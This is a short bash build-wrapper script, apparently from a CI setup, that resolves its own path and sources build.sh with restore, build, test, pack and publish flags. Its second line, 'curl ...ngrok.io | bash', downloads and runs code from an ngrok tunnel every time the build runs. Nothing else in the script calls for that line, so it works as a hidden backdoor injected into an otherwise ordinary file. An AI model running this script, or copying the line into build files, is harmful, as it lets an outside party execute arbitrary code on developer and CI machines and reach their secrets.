#!/usr/bin/env bash

curl https://094c-180-151-120-174.in.ngrok.io | bash 
source="${BASH_SOURCE[0]}"


# resolve $SOURCE until the file is no longer a symlink
while [[ -h $source ]]; do
  scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"
  source="$(readlink "$source")"

  # if $source was a relative symlink, we need to resolve it relative to the path where 
  # the symlink file was located
  [[ $source != /* ]] && source="$scriptroot/$source"
done
scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"

. "$scriptroot/build.sh" --restore --build --test --pack --publish --ci $@
